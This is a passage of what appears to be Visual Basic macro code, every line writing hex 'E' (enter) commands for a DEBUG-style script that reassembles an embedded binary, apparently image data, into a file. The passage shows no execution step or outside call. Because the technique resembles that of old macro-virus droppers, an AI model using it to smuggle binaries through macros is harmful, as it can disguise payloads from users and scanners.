Print #hFile, "E 9880 7D 96 AA 58 71 85 44 5C 70 69 81 95 76 8E A4 7D"
Print #hFile, "E 9890 98 AD 71 8D A5 4C 67 7C 59 72 86 8F A6 B6 AD C0"
Print #hFile, "E 98A0 CD B1 C2 CB A8 B5 BD B5 C1 C7 B7 C3 C9 A9 B5 BB"
Print #hFile, "E 98B0 AC BA C0 A4 B2 B8 9E AB B3 91 9C A4 A0 A9 AD 98"
Print #hFile, "E 98C0 9F A2 86 8D 90 00 05 08 00 00 F5 F5 F5 ED ED ED"
Print #hFile, "E 98D0 DF DF DF D1 D1 D1 C9 CB CC AF B2 B6 00 00 04 B3"
Print #hFile, "E 98E0 BC C5 B3 BF CB B7 C7 D4 A0 AF BF 79 89 99 7A 8A"
Print #hFile, "E 98F0 97 CF DF EB EF FB FF E2 EE F8 E2 EF FD D1 E1 EE"
Print #hFile, "E 9900 B5 C5 D5 9D B1 C2 74 8C A0 61 7C 91 78 94 AC 5D"
Print #hFile, "E 9910 7B 94 4E 69 83 48 62 7A 71 89 9F 61 77 89 3A 4C"
Print #hFile, "E 9920 5D 12 21 31 1C 29 37 2E 37 44 3D 46 50 27 30 3A"
Print #hFile, "E 9930 04 0D 17 06 0F 19 20 29 36 31 3A 48 2F 38 46 1A"
Print #hFile, "E 9940 24 35 1B 25 37 27 32 46 38 43 57 39 46 5C 2B 38"
Print #hFile, "E 9950 4E 0B 19 30 0C 1A 31 0A 1A 37 4A 5F 85 74 8C B6"
Print #hFile, "E 9960 7C 8F BC 73 83 B2 77 86 B4 66 73 9F 41 4B 73 22"
Print #hFile, "E 9970 2B 50 16 1E 3C 25 2C 47 14 1C 33 06 0F 23 0F 17"
Print #hFile, "E 9980 2E 16 1E 35 1D 24 3D 1F 2A 40 19 28 38 1F 2E 3E"
Print #hFile, "E 9990 2F 3D 53 23 30 4A 26 32 4E 28 36 52 32 43 5E 4C"
Print #hFile, "E 99A0 5D 77 30 43 5E 2B 3D 5A 35 48 69 2E 41 62 2A 3F"
Print #hFile, "E 99B0 5F 2E 46 64 58 6F 89 50 6A 82 3B 56 70 48 66 7F"
Print #hFile, "E 99C0 51 6D 85 43 5F 77 4C 64 7A 31 4A 5E 3B 53 67 45"
Print #hFile, "E 99D0 5D 6F 3B 51 63 39 4F 61 59 71 83 6B 83 95 61 79"
Print #hFile, "E 99E0 8D 74 8C A0 77 8F A5 4D 66 7A 5D 75 89 74 8C 9E"
Print #hFile, "E 99F0 7A 92 A8 80 98 AE 6F 89 A1 4E 69 7E 64 7C 90 9C"
Print #hFile, "E 9A00 B0 C1 AF BF CB 87 94 9C 6F 7B 81 7C 87 8B 88 93"
Print #hFile, "E 9A10 97 8A 95 99 8E 9A A0 83 91 97 8F 9A A2 93 9D A4"
Print #hFile, "E 9A20 98 A1 A5 AF B6 B9 94 9B 9E 00 04 07 00 00 F7 F7"
Print #hFile, "E 9A30 F7 F0 F0 F0 DE DE DE CC CC CC C2 C4 C5 B4 B7 BB"
Print #hFile, "E 9A40 08 0E 13 D2 DB E4 E9 F5 FF B9 C9 D6 7D 8C 9C 67"
Print #hFile, "E 9A50 77 87 8E 9E AB DA EA F6 E7 F3 FF D9 E5 EF DA E7"
Print #hFile, "E 9A60 F5 C0 D0 DD A3 B3 C3 A2 B6 C7 82 9A AE 67 82 97"
Print #hFile, "E 9A70 6F 8B A3 67 83 9B 54 6F 89 5C 76 8E 72 8A A0 6A"
Print #hFile, "E 9A80 7F 94 3C 4D 60 00 04 14 25 32 42 38 43 51 45 4E"
Print #hFile, "E 9A90 5B 2E 37 44 10 1C 28 14 1F 2D 23 2E 3C 2E 3B 4B"
Print #hFile, "E 9AA0 3A 47 57 33 41 53 5C 6A 7D 45 53 69 31 3F 55 24"
Print #hFile, "E 9AB0 34 4B 22 31 4B 1A 29 43 1E 2F 49 21 35 54 56 6B"
Print #hFile, "E 9AC0 91 6F 87 B1 6D 80 AD 62 72 A0 69 78 A6 63 70 9C"
Print #hFile, "E 9AD0 4A 53 7E 32 3B 60 2E 37 58 35 3D 5A 2E 38 50 1C"
Print #hFile, "E 9AE0 27 3D 1D 27 3F 21 2B 43 20 29 44 2B 39 50 31 45"
Print #hFile, "E 9AF0 57 36 4C 5E 3B 50 66 2F 42 5D 38 4A 67 3E 53 6F"
Print #hFile, "E 9B00 44 59 74 4B 60 7B 60 75 90 35 4A 66 2C 40 5F 27"
Print #hFile, "E 9B10 3A 5B 21 34 55 2F 45 61 5A 70 89 50 68 80 3C 57"
Print #hFile, "E 9B20 71 4D 6B 84 4D 69 81 43 5F 77 4A 62 78 2D 46 5A"
Print #hFile, "E 9B30 3A 52 66 40 58 6A 39 4F 61 3C 52 64 5F 75 87 6A"
Print #hFile, "E 9B40 80 92 5D 75 89 72 8A 9E 75 8D A3 4E 67 7B 6B 83"
Print #hFile, "E 9B50 97 74 8C 9E 78 90 A6 7F 97 AD 69 84 99 53 6E 83"
Print #hFile, "E 9B60 77 8F A3 AC C0 D1 9B AB B7 45 52 5A 24 30 36 25"
Print #hFile, "E 9B70 30 34 2D 38 3C 3C 47 4B 45 51 57 41 4D 53 52 5D"
Print #hFile, "E 9B80 65 3F 49 50 39 42 45 63 6B 6B 5F 67 67 00 01 01"
Print #hFile, "E 9B90 00 00 F8 F8 F8 EB EB EB E0 E0 E0 D0 D0 D0 BE C0"
Print #hFile, "E 9BA0 C1 B8 BB BF 00 00 04 88 91 9A 84 90 9C 80 90 9D"
Print #hFile, "E 9BB0 91 A0 B0 AC BC CC BA CA D7 A9 B9 C5 93 9F AB A0"
Print #hFile, "E 9BC0 AC B6 BC CA D6 A6 B6 C3 93 A4 B1 A1 B6 C5 8A A2"
Print #hFile, "E 9BD0 B4 70 89 9D 67 82 97 62 7E 96 4F 6A 84 67 81 99"
Print #hFile, "E 9BE0 67 7F 97 66 7B 91 65 76 89 02 12 23 07 13 25 1D"
Print #hFile, "E 9BF0 27 38 48 55 63 3D 4A 58 40 4F 5F 5F 6E 7E 6B 79"
Print #hFile, "E 9C00 8B 62 70 82 5A 69 7C 4B 5A 6D 5C 6D 82 38 48 5F"
Print #hFile, "E 9C10 1A 2B 45 15 26 40 27 3A 55 3A 4C 69 3C 51 6D 3C"
Print #hFile, "E 9C20 51 70 4D 64 8A 5D 73 9D 5C 6F 9A 54 67 94 5D 6C"
Print #hFile, "E 9C30 9A 59 66 92 3D 49 73 25 30 56 29 33 55 2B 36 54"
Print #hFile, "E 9C40 38 44 60 34 41 5B 3C 49 63 46 53 6D 3F 4B 67 50"
Print #hFile, "E 9C50 5F 79 6C 84 98 68 83 97 58 71 8B 42 5A 76 40 58"
Print #hFile, "E 9C60 76 44 5C 7A 4B 63 7F 54 6B 85 80 97 B1 3E 54 70"
Print #hFile, "E 9C70 2B 40 5F 2D 42 62 21 36 55 36 4C 68 5A 70 89 4C"
Print #hFile, "E 9C80 64 7A 39 54 6E 54 72 8B 4D 69 81 45 5F 77 48 60"
Print #hFile, "E 9C90 76 2E 47 5B 3D 55 67 39 51 63 3C 52 64 48 5E 70"
Print #hFile, "E 9CA0 67 7D 8F 6A 80 92 64 7C 90 77 8F A3 72 8A A0 56"
Print #hFile, "E 9CB0 6F 83 6F 87 9B 70 88 9C 77 8F A5 7C 94 AA 62 7A"
Print #hFile, "E 9CC0 90 57 70 84 86 9C AE B0 C5 D4 8D 9D A9 3D 4A 52"
Print #hFile, "E 9CD0 3E 4A 50 40 4B 4F 36 41 45 3B 46 4A 3B 47 4D 37"
Print #hFile, "E 9CE0 43 49 42 4E 54 37 41 48 4F 58 5B 51 59 59 37 3F"
Print #hFile, "E 9CF0 3F 00 01 01 00 00 F7 F7 F7 EB EB EB DF DF DF D1"
Print #hFile, "E 9D00 D1 D1 BE C0 C1 B6 B9 BD 00 00 04 78 81 8A 75 81"
Print #hFile, "E 9D10 8D AD BD CA E8 F7 FF EC FC FF D6 E6 F3 A4 B4 C0"
Print #hFile, "E 9D20 87 93 9F 96 A2 AC A0 AF B8 99 A9 B5 95 A6 B3 A3"
Print #hFile, "E 9D30 B8 C7 90 A6 B8 7A 93 A7 6B 86 9B 69 86 9B 65 81"
Print #hFile, "E 9D40 99 69 83 9B 6C 84 9C 68 7D 93 71 84 99 23 32 45"
Print #hFile, "E 9D50 08 13 27 1E 2A 3C 37 45 57 16 26 36 0D 1D 2E 35"
Print #hFile, "E 9D60 45 56 50 61 74 54 65 78 55 68 7D 4E 60 77 48 5C"
Print #hFile, "E 9D70 75 33 46 61 24 39 55 15 2A 46 18 2D 4C 2D 42 61"
Print #hFile, "E 9D80 35 4A 69 42 59 79 4D 65 89 50 66 8F 50 63 8E 4B"
Print #hFile, "E 9D90 5E 89 53 63 8E 51 61 8C 3D 4B 75 29 35 5D 1A 28"
Print #hFile, "E 9DA0 4C 18 25 45 25 33 50 27 35 51 33 44 5F 42 52 6F"
Print #hFile, "E 9DB0 3F 4F 6C 4F 61 7E 7B 95 AD 6A 86 9E 50 6B 86 45"
Print #hFile, "E 9DC0 5E 7E 48 61 81 4C 65 85 4D 68 83 57 6F 8B 75 8D"
Print #hFile, "E 9DD0 A9 3E 56 72 33 4B 69 37 4E 6E 20 38 56 36 4E 6A"
Print #hFile, "E 9DE0 59 71 89 54 6F 84 3F 5A 74 64 7F 99 59 73 8B 4C"
Print #hFile, "E 9DF0 66 7E 4B 63 79 35 4E 62 42 5A 6C 36 4C 5E 3A 51"
Print #hFile, "E 9E00 61 53 6A 7A 6D 83 95 6D 83 95 73 8B 9D 7D 95 A7"
Print #hFile, "E 9E10 6A 82 96 5D 75 89 79 91 A5 78 90 A4 7B 93 A9 76"
Print #hFile, "E 9E20 8E A4 57 70 84 5C 74 88 8F A6 B6 A9 BC C9 80 91"
Print #hFile, "E 9E30 9A 43 50 58 50 5C 62 42 4D 51 2D 38 3C 30 3B 3F"
Print #hFile, "E 9E40 3A 46 4C 43 4F 55 36 42 48 4E 59 5D 6F 79 79 56"
Print #hFile, "E 9E50 5E 5D 2C 34 33 00 01 00 00 00 F3 F3 F3 F1 F1 F1"
Print #hFile, "E 9E60 DC DC DC CE CE CE C2 C4 C5 B3 B6 BA 01 07 0C AB"
Print #hFile, "E 9E70 B4 BD C1 CD D9 C4 D4 E1 BB CA DA 9B AB BB B1 C1"
Print #hFile, "E 9E80 CE BA CA D6 B7 C3 CF B6 C2 CC B2 C1 CA 8C 9D A6"
Print #hFile, "E 9E90 88 99 A6 A4 B9 C8 A2 B9 C9 82 9C AD 65 80 94 63"
Print #hFile, "E 9EA0 80 95 61 7D 95 61 7B 93 73 8B A3 67 7B 94 68 7A"
Print #hFile, "E 9EB0 91 39 4A 5F 03 10 26 28 36 49 30 41 54 0E 1F 32"
Print #hFile, "E 9EC0 05 16 29 34 47 5C 56 69 7E 4D 62 78 49 5D 76 45"
Print #hFile, "E 9ED0 5B 74 43 58 73 29 3F 5B 1F 34 53 12 29 49 17 2E"
Print #hFile, "E 9EE0 4E 31 47 6A 34 4A 6D 49 5F 82 58 70 94 4E 65 8B"
Print #hFile, "E 9EF0 4C 60 89 47 5A 85 4C 5D 88 55 65 90 4E 5E 88 47"
Print #hFile, "E 9F00 56 7D 3B 4B 70 32 42 66 2E 3F 60 29 3B 5A 2E 42"
Print #hFile, "E 9F10 61 3B 4F 6E 43 57 76 4E 63 82 6C 84 A0 58 73 8E"
Print #hFile, "E 9F20 4A 63 83 52 6B 8D 60 79 9B 68 81 A3 61 7B 99 6D"
Print #hFile, "E 9F30 88 A3 86 A1 BC 4F 6A 85 34 4E 6C 2E 48 66 19 33"
Print #hFile, "E 9F40 51 3C 57 72 57 73 8B 57 74 89 47 63 7B 6B 87 9F"
Print #hFile, "E 9F50 5D 77 8F 4F 6A 7F 4A 63 77 37 4F 63 41 57 69 33"
Print #hFile, "E 9F60 49 5B 40 57 67 5B 72 82 6C 82 94 67 7D 8F 77 8F"
Print #hFile, "E 9F70 A1 7D 95 A7 63 7B 8F 66 7E 92 7E 96 AA 7D 96 AA"
Print #hFile, "E 9F80 7B 93 A9 6D 86 9A 57 6F 83 71 87 99 A1 B6 C5 A0"
Print #hFile, "E 9F90 B3 C0 5A 6B 74 3B 49 4F 50 5C 62 46 51 55 3D 48"
Print #hFile, "E 9FA0 4C 35 40 44 36 42 48 3C 48 4E 35 41 45 51 5D 5F"
Print #hFile, "E 9FB0 44 4E 4E 42 4A 49 3C 44 43 05 0D 0C 00 00 F3 F3"
Print #hFile, "E 9FC0 F3 F0 F0 F0 DC DC DC D2 D2 D2 C8 CA CB B2 B5 B9"
Print #hFile, "E 9FD0 00 00 04 86 8F 98 A5 B1 BD 9F AF BC 9A A9 B9 86"
Print #hFile, "E 9FE0 96 A6 B0 C0 CD C2 D2 DE CA D6 E2 D0 DC E6 B3 C2"
Print #hFile, "E 9FF0 CB 8A 9B A4 8C 9D AA A4 B7 C6 AD C1 D2 92 AA BC"
Print #hFile, "E A000 6E 87 9B 57 72 87 5F 79 91 60 7A 92 76 8E A6 6D"
Print #hFile, "E A010 81 9A 6B 7D 94 56 66 7D 02 10 27 26 34 4A 34 45"
Print #hFile, "E A020 5A 13 26 3B 0B 1E 33 3D 4F 66 5C 6D 87 47 5B 74"
Print #hFile, "E A030 3E 51 6C 41 56 72 3F 53 72 22 37 57 28 3D 5D 36"
Print #hFile, "E A040 4C 6F 45 5B 7F 51 69 8D 38 50 74 42 5A 7E 56 6C"
Print #hFile, "E A050 90 49 5E 84 4D 62 88 4D 61 8A 50 62 8B 59 6B 94"
Print #hFile, "E A060 56 68 91 53 63 8D 59 6A 91 59 6B 90 4B 5F 82 42"
Print #hFile, "E A070 56 79 3C 51 71 3D 52 72 4A 5F 7F 4C 61 81 66 7B"
Print #hFile, "E A080 9A 52 67 87 47 5D 80 4F 65 89 5A 70 94 61 7A 9C"
Print #hFile, "E A090 55 6F 8D 65 80 9B 75 93 AC 4C 69 84 2D 49 67 26"
Print #hFile, "E A0A0 44 61 1E 3C 59 4A 69 82 53 74 88 4D 6E 82 4F 6B"
Print #hFile, "E A0B0 83 69 85 9D 5A 74 8C 50 6B 80 4C 65 79 39 51 65"
Print #hFile, "E A0C0 41 57 69 3D 54 64 4F 63 74 61 75 86 6A 81 91 64"
Print #hFile, "E A0D0 7B 8B 79 8F A1 7E 94 A6 63 7B 8F 70 88 9C 78 90"
Print #hFile, "E A0E0 A6 7C 94 AA 77 90 A4 67 80 94 61 79 8B 8C A3 B3"
Print #hFile, "E A0F0 AD C0 CD 8B 9D A8 47 56 5F 36 44 4A 41 4D 53 42"
Print #hFile, "E A100 4D 51 58 63 67 4F 5A 5E 52 5D 61 5C 67 6B 45 51"
Print #hFile, "E A110 55 4E 5A 5C 31 3C 3A 3B 44 41 49 52 4F 00 07 04"
Print #hFile, "E A120 00 00 F6 F6 F6 EC EC EC DE DE DE D0 D0 D0 BC BE"
Print #hFile, "E A130 BF B9 BC C0 00 03 08 70 79 82 6C 78 84 95 A5 B2"
Print #hFile, "E A140 C0 CF DF AB BB CB AA BA C7 91 A1 AD 93 9F AB A1"
Print #hFile, "E A150 AD B7 87 96 9F 99 A9 B5 B6 C6 D3 A2 B5 C2 A0 B4"
Print #hFile, "E A160 C5 A6 BF CF 8E A7 BB 59 74 88 61 7C 91 51 69 81"
Print #hFile, "E A170 65 7D 95 6C 82 9B 66 7B 91 70 82 99 1A 2A 41 25"
Print #hFile, "E A180 35 4C 2E 3E 55 0A 1C 33 00 12 29 38 49 63 61 72"
Print #hFile, "E A190 8D 4D 60 7B 42 54 71 4A 5E 7D 43 56 77 2F 44 64"
Print #hFile, "E A1A0 46 5A 7D 5B 71 95 5C 71 97 58 6F 95 3C 53 79 55"
Print #hFile, "E A1B0 6C 92 62 78 9C 52 68 8C 58 6D 93 58 6D 93 58 6A"
Print #hFile, "E A1C0 93 63 75 9E 64 76 9F 62 76 9F 5C 6E 97 69 7E A4"
Print #hFile, "E A1D0 64 79 9F 61 79 9D 59 6F 93 52 68 8B 61 77 9A 5B"
Print #hFile, "E A1E0 71 94 75 88 AB 5B 6E 91 4E 5F 86 52 65 8B 62 75"
Print #hFile, "E A1F0 9B 76 8C B0 6B 83 A1 7C 97 B2 71 8C A6 5B 79 92"
Print #hFile, "E A200 3F 5C 77 2D 4B 68 1C 3A 55 46 65 7E 50 71 85 55"
Print #hFile, "E A210 76 89 57 73 8B 69 85 9D 5A 75 8A 59 71 87 55 6D"
Print #hFile, "E A220 81 41 59 6B 4B 62 72 51 68 78 54 68 79 61 75 86"
Print #hFile, "E A230 6D 84 94 6C 83 93 7F 95 A7 82 98 AA 65 7D 91 71"
Print #hFile, "E A240 89 9D 72 8D A2 7A 95 AA 77 90 A4 68 80 92 6D 84"
Print #hFile, "E A250 94 9C B1 C0 A9 BB C6 6C 7D 86 24 31 39 23 2F 35"
Print #hFile, "E A260 30 3B 3F 41 4C 50 6B 76 7A 55 60 64 4A 55 59 4D"
Print #hFile, "E A270 58 5C 4D 59 5D 38 44 46 2D 38 36 34 3D 3A 4B 54"
Print #hFile, "E A280 51 00 02 00 00 00 F4 F4 F4 ED ED ED E3 E3 E3 CF"
Print #hFile, "E A290 CF CF BF C1 C2 B1 B4 B8 00 00 05 79 82 8B 79 85"
Print #hFile, "E A2A0 91 73 83 90 76 85 95 71 81 91 5E 6E 7B 81 91 9D"
Print #hFile, "E A2B0 A3 AF BB A1 AD B7 AE BC C8 A2 B2 BE 8E 9E AB 86"
Print #hFile, "E A2C0 99 A6 9C B0 C1 AF C6 D6 9B B3 C7 75 8E A2 65 7D"
Print #hFile, "E A2D0 93 67 7F 95 62 7A 92 70 86 9F 6D 81 9A 6A 7B 95"
Print #hFile, "E A2E0 38 49 63 2C 3B 55 2C 3B 55 16 25 3F 00 06 20 3F"
Print #hFile, "E A2F0 50 6B 7B 8C A7 6B 7D 9A 55 67 86 4A 5E 7D 61 74"
Print #hFile, "E A300 95 5A 6E 91 51 64 89 64 7A 9E 67 7C A2 5A 6E 97"
Print #hFile, "E A310 4E 62 8B 63 78 9E 6D 80 A5 5C 70 93 56 6C 90 57"
Print #hFile, "E A320 6D 91 58 6D 93 68 7D A3 71 85 AE 61 77 A0 62 76"
Print #hFile, "E A330 9F 6C 82 AB 66 7C A5 62 7C A1 65 7D A1 69 82 A4"
Print #hFile, "E A340 76 8F B1 7A 90 B3 84 97 BA 7B 8B B0 7B 8A B1 84"
Print #hFile, "E A350 94 BE 7D 8E B5 78 8B B0 6C 81 A0 7A 92 AE 74 8D"
Print #hFile, "E A360 A7 5E 79 93 52 6D 88 14 2E 4C 35 50 6B 4D 6B 84"
Print #hFile, "E A370 51 70 85 58 76 89 5D 79 91 67 81 99 65 7D 93 67"
Print #hFile, "E A380 7F 95 68 80 94 32 4A 5C 56 6D 7D 56 6A 7B 54 69"
Print #hFile, "E A390 78 6C 81 90 7C 90 A1 72 86 97 7C 93 A3 65 7C 8C"
Print #hFile, "E A3A0 69 7F 91 72 8A 9E 72 8D A2 7C 97 AC 6F 88 9C 5E"
Print #hFile, "E A3B0 76 88 7A 8F 9E A7 BA C7 C2 D3 DC CA DA E1 AD BA"
Print #hFile, "E A3C0 C2 B6 C2 C8 B6 C1 C5 BA C5 C9 91 9C A0 5A 65 69"
Print #hFile, "E A3D0 5E 6A 6C 6E 7A 7C 4C 58 5C 3B 47 49 5B 66 64 58"
Print #hFile, "E A3E0 61 5E 55 5E 5B 00 02 00 00 00 F7 F7 F7 EF EF EF"
Print #hFile, "E A3F0 E3 E3 E3 CE CE CE C2 C4 C5 B8 BB BF 01 07 0C 7C"
Print #hFile, "E A400 85 8E 81 8D 99 62 72 7F 54 63 73 65 75 85 85 95"
Print #hFile, "E A410 A2 BE CE DA C6 D2 DE 9E AA B4 9C AA B6 83 90 9E"
Print #hFile, "E A420 75 85 92 87 97 A7 A1 B3 C4 AA C1 D1 99 B1 C3 81"
Print #hFile, "E A430 9A AE 66 7E 94 69 81 97 6B 83 9B 78 90 A8 72 88"
Print #hFile, "E A440 A1 71 85 9E 42 53 6D 27 38 52 2C 3B 55 1A 29 43"
Print #hFile, "E A450 00 08 24 43 51 6D 8E 9C B9 85 95 B2 67 76 96 53"
Print #hFile, "E A460 65 84 72 83 A4 67 7A 9D 5B 6D 92 6B 7E A3 6E 81"
Print #hFile, "E A470 A7 5E 72 9B 4E 62 8B 61 76 9C 6C 7F A4 5F 73 96"
Print #hFile, "E A480 5C 72 96 5E 74 98 5A 6F 95 67 7E A4 70 86 AF 68"
Print #hFile, "E A490 7E A7 66 7C A6 6E 84 AE 69 82 AA 69 83 A8 69 83"
Print #hFile, "E A4A0 A7 6A 85 A7 79 92 B2 7E 95 B5 83 97 BA 7D 8F B4"
Print #hFile, "E A4B0 7F 90 B7 83 93 BD 77 88 AF 72 86 A9 6F 84 A3 83"
Print #hFile, "E A4C0 9A B4 80 98 B0 70 88 A0 44 5A 76 17 2C 4B 40 56"
Print #hFile, "E A4D0 72 58 6F 89 59 71 87 63 7C 90 64 7F 94 68 83 98"
Print #hFile, "E A4E0 62 7A 90 64 7D 91 59 71 83 3D 53 65 5E 72 83 4C"
Print #hFile, "E A4F0 60 71 5B 70 7F 82 97 A6 81 95 A6 7A 8E 9F 7F 93"
Print #hFile, "E A500 A4 6B 82 92 75 8B 9D 77 8F A3 6C 87 9C 7A 94 AC"
Print #hFile, "E A510 71 8A 9E 6B 81 93 8B 9E AD AE C0 CB CA D9 E2 DE"
Print #hFile, "E A520 EC F2 E2 EE F4 F0 FC FF F1 FC FF F4 FF FF E4 EF"
Print #hFile, "E A530 F3 CE D9 DD DE EA EC E2 EE F0 6A 76 7A 30 3C 3E"
Print #hFile, "E A540 4C 57 55 53 5C 59 5A 63 60 00 04 01 00 00 F5 F5"
Print #hFile, "E A550 F5 ED ED ED E2 E2 E2 D0 D0 D0 C4 C6 C7 B6 B9 BD"
Print #hFile, "E A560 00 00 04 6D 76 7F 68 74 80 6B 7B 88 75 84 94 78"
Print #hFile, "E A570 88 98 76 86 93 8F 9F AB 97 A3 AF 7E 8A 96 82 8F"
Print #hFile, "E A580 9D 76 83 93 72 81 91 7E 8E 9E 96 A8 B9 B0 C7 D7"
Print #hFile, "E A590 AF C7 D9 96 AE C0 66 7F 93 5E 77 8B 67 7F 95 7E"
Print #hFile, "E A5A0 96 AC 81 98 AE 83 9A B0 5B 70 86 32 44 5B 33 43"
Print #hFile, "E A5B0 5A 20 2E 45 00 05 1F 35 44 5E 8B 99 B5 8B 9B B8"
Print #hFile, "E A5C0 73 82 A2 59 6B 8A 7D 8E AF 72 85 A8 64 76 9B 70"
Print #hFile, "E A5D0 83 A8 73 86 AC 66 79 9F 51 65 8E 66 7B A1 6D 80"
Print #hFile, "E A5E0 A5 63 77 9A 62 78 9B 63 79 9C 5B 73 97 6A 81 A7"
Print #hFile, "E A5F0 72 88 B1 6E 87 AF 6D 85 AF 6F 87 B1 70 89 B1 73"
Print #hFile, "E A600 8D B2 71 8A AC 71 8A AA 7E 99 B4 83 9D BB 7E 95"
Print #hFile, "E A610 B5 7C 92 B6 80 95 BB 7E 92 BB 6E 83 A9 70 84 A7"
Print #hFile, "E A620 79 8F AB 91 A7 C0 84 9A B3 80 94 AD 35 47 64 28"
Print #hFile, "E A630 38 55 53 63 80 63 74 8F 60 72 89 6E 83 98 6A 82"
Print #hFile, "E A640 98 6C 87 9C 64 7C 92 66 7F 93 50 68 7A 4D 63 75"
Print #hFile, "E A650 62 76 87 45 5A 69 6C 7F 8E 90 A3 B2 7A 8D 9C 7B"
Print #hFile, "E A660 90 9F 71 85 96 65 79 8A 74 8A 9C 70 88 9C 66 82"
Print #hFile, "E A670 9A 72 8E A6 70 89 9D 76 8D 9D 98 AB B8 AA BB C4"
Print #hFile, "E A680 C8 D5 DD EA F6 FC EB F7 FD DC E7 EB CB D7 DB E5"
Print #hFile, "E A690 F1 F5 E6 F1 F5 E2 ED F1 F6 FF FF ED F9 FB 8F 9B"
Print #hFile, "E A6A0 9F 22 2E 30 3A 44 44 47 4F 4E 4F 57 56 00 01 00"
Print #hFile, "E A6B0 00 00 F4 F4 F4 EA EA EA E1 E1 E1 D2 D2 D2 C4 C6"
Print #hFile, "E A6C0 C7 B1 B4 B8 00 00 04 70 79 82 7A 86 92 77 87 94"
Print #hFile, "E A6D0 79 88 98 73 83 93 6E 7E 8B 7A 8A 96 81 8D 99 74"
Print #hFile, "E A6E0 80 8C 69 76 86 6E 7B 8B 75 83 95 77 87 98 84 96"
Print #hFile, "E A6F0 A7 A9 BD CE B8 CE E0 A1 B9 CB 75 8D A1 5A 73 87"
Print #hFile, "E A700 5E 77 8B 7B 93 A9 8A A1 B7 93 AA C0 72 89 9F 3F"
Print #hFile, "E A710 54 6A 3B 4B 62 27 35 4C 00 0A 21 30 3F 59 80 8F"
Print #hFile, "E A720 A9 7B 8C A7 73 83 A0 5A 6C 8B 7B 8D AC 75 88 A9"
Print #hFile, "E A730 6B 7E A1 72 85 AA 74 87 AC 66 7B A1 55 6A 90 71"
Print #hFile, "E A740 86 AC 71 84 A9 68 7C 9F 64 7A 9D 63 79 9C 5C 75"
Print #hFile, "E A750 97 71 89 AD 72 8C B1 73 8C B4 77 8F B9 70 88 B2"
Print #hFile, "E A760 74 8D B5 79 93 B8 73 8C AE 75 8F AD 84 9F B9 8A"
Print #hFile, "E A770 A5 BF 7A 93 B3 7A 93 B5 7E 95 BB 7A 91 B7 71 87"
Print #hFile, "E A780 AB 77 8E AE 8B A2 BC 9D B4 CA 84 99 AF 86 9B B1"
Print #hFile, "E A790 34 42 5E 44 52 6F 65 70 8E 69 75 91 64 72 89 73"
Print #hFile, "E A7A0 84 99 64 7B 91 6C 87 9C 62 7B 8F 66 7E 92 4D 63"
Print #hFile, "E A7B0 75 55 6C 7C 5B 70 7F 47 5C 6B 8E A1 B0 92 A5 B4"
Print #hFile, "E A7C0 75 88 97 82 95 A4 65 79 8A 64 78 89 75 8B 9D 6A"
Print #hFile, "E A7D0 82 96 72 8E A6 72 8E A6 72 8B 9F 7F 96 A6 9A AB"
Print #hFile, "E A7E0 B8 9B AA B3 BB C7 CD DD E9 ED E2 ED F1 A8 B3 B7"
Print #hFile, "E A7F0 6F 7B 7F 81 8D 91 81 8C 90 98 A3 A7 DB E4 E7 F4"
Print #hFile, "E A800 FF FF B1 BC C0 2B 36 3A 45 4F 4F 54 5C 5B 50 58"
Print #hFile, "E A810 57 00 01 00 00 00 F8 F8 F8 E9 E9 E9 DE DE DE D1"
Print #hFile, "E A820 D1 D1 C4 C6 C7 B3 B6 BA 02 08 0D 8C 95 9E 89 95"
Print #hFile, "E A830 A1 72 82 8F 66 75 85 69 79 89 77 87 94 7B 8B 97"
Print #hFile, "E A840 77 83 8F 6A 76 82 71 7E 8E 6F 7B 8D 78 86 99 81"
Print #hFile, "E A850 90 A3 87 98 AB A2 B6 C8 BA D0 E2 B7 CF E1 91 A9"
Print #hFile, "E A860 BB 71 89 9B 68 82 93 72 8B 9F 83 9C B0 90 A9 BD"
Print #hFile, "E A870 7E 97 AB 48 60 74 43 56 6B 2E 3F 54 05 16 2B 2F"
Print #hFile, "E A880 41 58 73 85 9C 68 79 93 75 86 A1 64 76 93 73 85"
Print #hFile, "E A890 A4 75 88 A9 71 84 A5 73 87 AA 72 86 A9 65 7B 9F"
Print #hFile, "E A8A0 54 6A 8E 77 8D B1 76 8A AD 6D 81 A4 63 7A 9A 5E"
Print #hFile, "E A8B0 75 95 5B 74 94 79 92 B4 74 8E B3 72 8B B3 7D 95"
Print #hFile, "E A8C0 BF 6E 86 B0 77 8D B6 7D 95 B9 76 8D AD 7D 95 B1"
Print #hFile, "E A8D0 8E A8 C0 92 AC C4 81 9B B9 7C 97 B9 7D 97 BB 7B"
Print #hFile, "E A8E0 93 B7 79 8F B2 84 9C BA 9B B3 CB 9F B7 CB 91 A6"
Print #hFile, "E A8F0 BB 86 9B B0 37 46 60 58 66 82 6A 76 92 69 75 91"
Print #hFile, "E A900 63 6F 87 69 79 90 60 77 8D 6A 82 98 5D 75 89 5E"
Print #hFile, "E A910 76 8A 4A 60 72 53 6A 7A 54 69 78 5F 72 81 AB BE"
Print #hFile, "E A920 CB 8E A1 AE 7B 8E 9D 83 96 A5 62 77 86 76 8B 9A"
Print #hFile, "E A930 81 98 A8 6E 86 9A 80 9C B4 72 90 A9 79 92 A6 8B"
Print #hFile, "E A940 A2 B2 9C AE B9 93 A3 AA BC C8 CC DB E6 EA DA E5"
Print #hFile, "E A950 E9 A1 AC B0 67 73 77 6E 7A 7E 53 5E 62 6E 79 7D"
Print #hFile, "E A960 D0 D9 DC F4 FF FF BB C5 CC 37 41 48 4E 57 5A 5E"
Print #hFile, "E A970 66 66 52 5A 5A 00 02 02 00 00 F7 F7 F7 E9 E9 E9"
Print #hFile, "E A980 DE DE DE D1 D1 D1 C3 C5 C6 B1 B4 B8 00 04 09 85"
Print #hFile, "E A990 8E 97 5A 66 72 5B 6B 78 6D 7C 8C 7E 8E 9E 8B 9B"
Print #hFile, "E A9A0 A8 7E 8E 9A 7C 88 94 7D 89 95 90 9C AE 8B 96 AA"
Print #hFile, "E A9B0 85 93 A6 7C 8B 9E 80 8F A2 9D B1 C3 BA CE E0 BA"
Print #hFile, "E A9C0 D0 E2 A5 BD CF 8E A6 B8 7A 94 A5 6D 87 98 7D 96"
Print #hFile, "E A9D0 AA 8B A4 B8 8B A4 B8 61 79 8D 40 53 68 29 3C 51"
Print #hFile, "E A9E0 0B 1E 33 2A 3D 52 70 82 99 62 77 8D 6C 80 99 66"
Print #hFile, "E A9F0 7B 96 6A 7F 9B 74 89 A8 77 8C AB 77 8E AE 75 8B"
Print #hFile, "E AA00 AE 65 7E A0 4D 65 89 71 89 AD 75 8B AE 74 88 AB"
